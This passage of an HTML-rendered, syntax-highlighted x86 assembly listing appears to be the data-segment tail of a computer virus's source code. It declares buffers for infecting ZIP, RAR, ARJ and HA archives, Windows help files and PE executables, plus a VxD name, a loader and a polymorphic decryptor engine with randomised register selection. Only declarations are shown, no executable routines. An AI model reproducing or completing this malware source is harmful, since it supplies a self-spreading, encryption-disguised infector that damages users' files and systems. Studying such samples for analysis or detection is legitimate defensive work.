        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;BIT 0 - REENTERING FLAG</span><span class="sc0">
</span><span class="sc5">SYS_PATH_DELTA</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SYS_PATH_RELO</span><span class="sc0">
</span><span class="sc5">SHELL_FLAG_DELTA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SHELL_FLAG_RELO</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">TMP_PATH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">AREA_COMMON_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SYS_FILE_HEADER</span><span class="sc0">
        </span><span class="sc5">FILE_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc5">SYSTEM_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">BUFF4MACRO</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">LEN_UUD</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">LEN_RDROP_CON</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_1</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">IO_BUFFER</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_IOBUFF</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_1</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_ARJ_FHEADER</span><span class="sc0">
        </span><span class="sc5">ARJ_HDR_STRUC</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_1</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_HA_FHEADER</span><span class="sc0">
        </span><span class="sc5">HA_FILE_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MAX_DOS_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_1</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_RAR_FHEADER</span><span class="sc0">
        </span><span class="sc5">RAR_FILE_HDR</span><span class="sc0">    </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_1</span><span class="sc0">
</span><span class="sc5">OUR_LOCAL_HEADER_RELO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_LOCAL_HEADER</span><span class="sc0">
        </span><span class="sc5">ZIP_LOCAL_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_CENTRAL_HEADER</span><span class="sc0">
        </span><span class="sc5">ZIP_CENTRAL_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ZIP_CUR_OFF</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ZIP_CENTRAL_OFF</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ZIP_FILE_COUNTER</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ZIP_EXEC_FLAG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SIZE_ARC_AREA</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">OUR_LOCAL_HEADER_RELO</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INSERT_BUFF</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_IOBUFF</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">AREA_COMMON_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">FIND_DATA</span><span class="sc0">
        </span><span class="sc5">_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_2</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">HLP_HEADER</span><span class="sc0">
        </span><span class="sc5">HLP_START</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">HLP_DIRECTORY</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_HLP_DIR</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_2</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">BUFF_ZIP_HEADER</span><span class="sc0">
        </span><span class="sc5">ZIP_CENTRAL_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">AREA_COMMON_2</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">HEADER</span><span class="sc0">
        </span><span class="sc5">DOS_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">PHEADER</span><span class="sc0">
        </span><span class="sc5">PE_HEADER</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OTABLE</span><span class="sc0">
        </span><span class="sc5">OBJECT_TABLE</span><span class="sc0"> </span><span class="sc5">MAX_OBJS</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(&lt;&gt;)</span><span class="sc0">

</span><span class="sc5">AREA_COMMON_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">PUSHED_REGS</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SHIT_FLAG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">DIRTY_SREG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">DIRTY_WREG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;XXX1XXXX (1-USED,0-UNUSED)</span><span class="sc0">
</span><span class="sc1">;       ^AX</span><span class="sc0">
</span><span class="sc1">;      ^CX</span><span class="sc0">
</span><span class="sc1">;     ^DX</span><span class="sc0">
</span><span class="sc1">;    ^BX</span><span class="sc0">
</span><span class="sc1">;  ^BP</span><span class="sc0">
</span><span class="sc1">; ^SI</span><span class="sc0">
</span><span class="sc1">;^DI</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">WREG_LIST</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;VALID REGISTER LIST</span><span class="sc0">
</span><span class="sc5">SPE_COMMON</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ADDRESS_MODE</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;IF (HIBYTE)=0FFH THEN SHORT</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_VALUE</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;OFFSET VALUE</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">DELTA_VALUE</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;DELTA VALUE IN [OFF_REG+DELTA]</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">MASK_VALUE</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;MASK VALUE</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">TOP_ADDRESS</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;ADDRESS OF TOP DWORD</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">DEC_OFF_COUNT</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;DECREMENT OFF_REG COUNTER</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_REG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;OFFSET REGISTER</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">COUNT_REG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;COUNTER REGISTER</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">MASK_REG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;MASK REGISTER</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">WORK_REG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;WORK REGISTER</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">STORE_WR_FLAG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;STORING WORK_REG FLAG</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">CHG_WR_FLAG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;CHANGING WORK_REG FLAG</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SET_WR_FLAG</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;SETTING WORK_REG FLAG</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">DEC_ESP_COUNT</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;DECREMENT ESP COUNTER</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">WORD_MODE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;WORD (1) OR DWORD (0) MODE</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SPE32_BUFF</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">SPE_COMMON</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ADDRESS_EMPTY</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ADDRESS_BUFF</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">LEN_DECRYPTOR</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;BUFFER FOR ADDRESSES</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">LEN_SEEK</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SEEK_TABLE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_DECRYPTOR</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;FOR CHOOSE DECRYPTOR BYTES</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">TEMP_DECRYPTOR</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_DECRYPTOR</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;TEMPORARY DECRYPTOR BUFFER</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">ENCRYPT_BUFF</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">LEN_MAIN_BUFF</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;WORK BUFFER</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">SET_ALIGN</span><span class="sc0">
</span><span class="sc5">SET_ALIGN_NEW</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(((</span><span class="sc5">SET_ALIGN</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">))-</span><span class="sc5">END_CODE16</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc5">SET_ALIGN_NEW</span><span class="sc0">       </span><span class="sc1">;ALIGN 4 (GLOBAL)</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">MAIN_BUFF</span><span class="sc0">
</span><span class="sc5">IMM_MBUFF</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc4">((</span><span class="sc5">OUR_LEN</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">LEN_LOADER</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;100H-MAX LENGTH OF END SHIT</span><span class="sc0">
</span><span class="sc5">SIZE_MBUFF</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">IMM_MBUFF</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">VXD_NAME</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">MIN_VXDNAME_SIZE</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">TOTAL_LEN</span><span class="sc0">

</span><span class="sc5">TOTAL_PAGE_NUM</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">TOTAL_LEN</span><span class="sc4">+</span><span class="sc2">0FFFH</span><span class="sc4">)/</span><span class="sc2">1000H</span><span class="sc0">

        </span><span class="sc9">ENDS</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
